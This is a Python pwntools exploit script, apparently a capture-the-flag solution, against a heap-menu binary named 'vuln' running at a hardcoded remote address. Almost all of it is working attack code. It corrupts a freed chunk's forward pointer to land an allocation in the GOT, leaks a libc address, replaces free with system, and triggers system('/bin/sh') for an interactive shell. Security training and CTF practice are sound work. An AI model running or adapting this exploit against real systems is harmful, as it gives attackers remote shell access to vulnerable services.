#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 34.159.129.6 --port 32722 vuln
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('vuln')
libc = ELF('libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '34.159.7.96'
port = int(args.PORT or 32552)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RUNPATH:  b'./'

io = start()

# create and free 2 chunks to get a forward pointer
io.sendlineafter(b"Choice: ", b"1")
io.sendlineafter(b"Choice: ", b"2")
io.sendafter(b"What is your name: ", b"a")
io.sendlineafter(b"Choice: ", b"6")
io.sendlineafter(b"Choice: ", b"7")

# change forward pointer to overwrite target
io.sendlineafter(b"Choice: ", b"4")
io.sendafter(b"What is your name: ", pack(exe.got['free']))

# overlap admin and user chunks and write "/bin/sh"
io.sendlineafter(b"Choice: ", b"1")
io.sendlineafter(b"Choice: ", b"6")
io.sendlineafter(b"Choice: ", b"2")
io.sendafter(b"What is your name: ", b"/bin/sh\x00")

# allocate chunk in GOT
io.sendlineafter(b"Choice: ", b"2")
io.sendafter(b"What is your name: ", b"a")

# print libc address
io.sendlineafter(b"Choice: ", b"5")
io.recvuntil(b"Students name is ")
leak = io.recvuntil(b"\n", drop=True).ljust(8, b'\x00')
libc.address = (unpack(leak) & 0xffffffffffffff00) - (libc.sym['free'] & 0xffffffffffffff00)
io.success("libc : " + hex(libc.address))

# change free GOT entry to system
io.sendlineafter(b"Choice: ", b"4")
io.sendafter(b"What is your name: ", pack(libc.sym['system']))

# call system("/bin/sh")
io.sendlineafter(b"Choice: ", b"6")

io.interactive()

